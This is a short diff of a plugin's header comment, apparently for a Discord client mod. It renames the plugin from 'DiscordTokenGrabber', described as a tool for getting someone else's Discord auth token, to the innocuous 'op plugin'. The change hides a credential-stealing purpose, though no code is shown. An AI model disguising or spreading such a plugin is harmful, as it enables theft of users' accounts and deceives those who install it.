@@ -1,7 +1,7 @@
 /** 
-  * @name DiscordTokenGrabber
+  * @name op
   * @version 1.1
-  * @description Plugin for getting someone else's auth token Discord
+  * @description op plugin
 */
 
 /* Authors
